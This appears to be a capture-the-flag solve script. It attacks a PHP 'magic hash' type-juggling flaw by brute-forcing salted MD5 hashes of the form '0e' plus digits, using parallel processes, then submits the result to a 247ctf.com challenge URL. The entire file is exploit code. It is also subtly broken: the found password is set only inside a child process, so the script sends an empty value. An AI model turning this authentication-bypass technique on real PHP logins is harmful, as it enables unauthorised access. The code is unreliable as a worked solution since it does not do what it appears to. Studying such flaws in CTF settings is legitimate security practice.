import random
import time
import multiprocessing
import string
import requests
from pwnlib.util.hashes import md5sumhex

salt = "f789bbc328a3d1a3"
# 0e[...] == 0 in php
# password_hash = "0e902564435691274142490923013038" == 0

def worker(i, terminate, foundit):
    print(f'{i} starts')
    while not terminate.is_set():
        pwd = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
        md5 = md5sumhex(salt.encode() + pwd.encode())
        if md5[2:].isnumeric():
            print(F'{i}:{pwd}:{md5}')
            if md5[:2] == '0e':
                password = pwd
                print(F'>>>>>> {i}:{pwd}:{md5}')
                foundit.set()
                break
    print(f'{i} exits')

if __name__ == "__main__":
    starttime = time.time()
    terminate = multiprocessing.Event()
    foundit = multiprocessing.Event()
    password = ''
    for i in range(multiprocessing.cpu_count()):
        p = multiprocessing.Process(target=worker, args=(i, terminate, foundit))
        p.start()
    foundit.wait()
    terminate.set()
    print(f'Total running time: {time.time() - starttime} seconds')

    response = requests.get(
        'https://48776c30f094555b.247ctf.com/',
        params={'password': password},
    )
    
    print(response.text[:100])